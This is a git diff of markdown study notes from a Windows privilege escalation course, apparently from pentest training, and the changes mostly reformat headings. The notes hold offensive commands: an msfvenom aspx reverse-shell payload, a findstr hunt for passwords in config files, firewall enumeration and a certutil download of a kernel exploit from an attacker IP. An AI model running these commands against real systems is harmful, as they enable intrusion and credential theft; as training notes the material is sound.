@@ -1,6 +1,10 @@
+---
+description: '- TCM'
+---
+
 # Windows Privilege Escalation Course
 
-**Gaining a Foothold**
+## **Gaining a Foothold**
 
 ```text
 nmap -A -T4 -p- IP  
@@ -10,9 +14,9 @@ aspx simple Metasploit shell
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT 4444 -f aspx > exploit.aspx
 ```
 
-**Enumeration**
+## **Enumeration**
 
-System Enumeration
+### System Enumeration
 
 ```text
 getuid  
@@ -32,7 +36,7 @@ wmic qfe get Caption,Description, HotFixID, InstalledOn
 wmic logicaldisk get caption,description,providername
 ```
 
-User Enumeration
+### User Enumeration
 
 ```text
 whoami  
@@ -43,7 +47,7 @@ net user raviraj
 net localgroup
 ```
 
-Network Enumeration
+### Network Enumeration
 
 ```text
 ipconfig /all  
@@ -52,13 +56,13 @@ route print
 netstat -ano
 ```
 
-**Password hunting**
+### **Password hunting**
 
 ```text
 findstr /si password \*.txt \*.ini \*.config
 ```
 
-**- A/V and Firewall Enumeration**
+### **- A/V and Firewall Enumeration**
 
 \(service control\)
 
@@ -71,34 +75,33 @@ netsh firewall show state
 netsh firewall show config
 ```
 
-**Exploring Automated Tools**
+### **Exploring Automated Tools**
 
-\( Executables \)
+#### Executables 
 
-winPeas.exe  
-Seatbelt.exe\(compile\)  
-Watson.exe\(compile\)  
-SharpUp.exe\(compile\)
+* winPeas.exe
+*  Seatbelt.exe\(compile\)
+* Watson.exe\(compile\)
+* SharpUp.exe\(compile\)
 
-\( PowerShell \)
+#### PowerShell
 
-Sherlock.ps1  
-PowerUp.ps1  
-jaws-enum.ps1
+* Sherlock.ps1
+* PowerUp.ps1
+* jaws-enum.ps1
 
-\( Other \)
+#### Other
 
-windows-exploit-suggester.py \(local\)  
-Explit Suggester \(Metasploit\)
+* windows-exploit-suggester.py \(local\)
+* Explit Suggester \(Metasploit\)
 
-**pip Install command**
+> #### _**pip Install command Tip**_
 
 ```text
 curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
 ```
 
-**Escalation Path : Kernel exploit**  
-~~~~~~~~~~~~~
+## **Escalation Path : Kernel exploit**
 
 File Transfer utility in windows
 
@@ -106,9 +109,7 @@ File Transfer utility in windows
 certutil -urlcache -f http://10.10.10.10/MS10-059.exe ms.exe
 ```
 
-**Escalation Path : Password**  
-~~~~~~~~~~~~~
+**Escalation Path : Password**
 
-**Escalation Path :** Windows subsystem for Linux  
-~~~~~~~~~~~~~
+**Escalation Path :** Windows subsystem for Linux
 
